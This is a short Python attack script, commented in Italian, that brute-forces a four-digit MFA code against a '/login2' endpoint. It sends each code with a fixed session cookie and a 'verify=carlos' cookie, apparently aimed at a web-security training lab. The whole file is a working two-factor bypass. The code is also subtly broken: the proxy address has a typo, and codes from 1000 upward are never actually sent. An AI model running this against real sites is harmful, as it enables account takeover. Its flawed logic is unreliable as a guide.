# EXPLOIT PARZIALE
# SOLO ENUMERAZIONE

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1_8080' , 'https' : 'http://127.0.0.1:8080'}


def perform_request(url,mfa_code_c):
    uri = "/login2"
    cookie = {'verify' : 'carlos' , 'session' : 'Qw6pOhxdDQEIG5a9UYiW3ROlyrUzyNHH'}
    data = {'mfa-code' : mfa_code_c}
    r = requests.post(url + uri, cookies=cookie, data=data, proxies=proxies, allow_redirects=False, verify=False)
    return r




def mfa_code_generator(url):
    for i in range(1,9999):
        mfa_code = str(i)
        if len(mfa_code) == 1:
            mfa_code_c = "000"+mfa_code
        elif len(mfa_code) == 2:
            mfa_code_c = "00"+mfa_code
        elif len(mfa_code) == 3:
            mfa_code_c = "0"+mfa_code
        sys.stdout.write("[+] Testando il codice: %s\r" % mfa_code_c)
        sys.stdout.flush()
        sys.stdout.write("\033[K")
        reponse = perform_request(url,mfa_code_c)
        if reponse.status_code == 302:
            print("[+] Usa il codice: %s" % mfa_code_c)
            return
        


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    mfa_code_generator(url)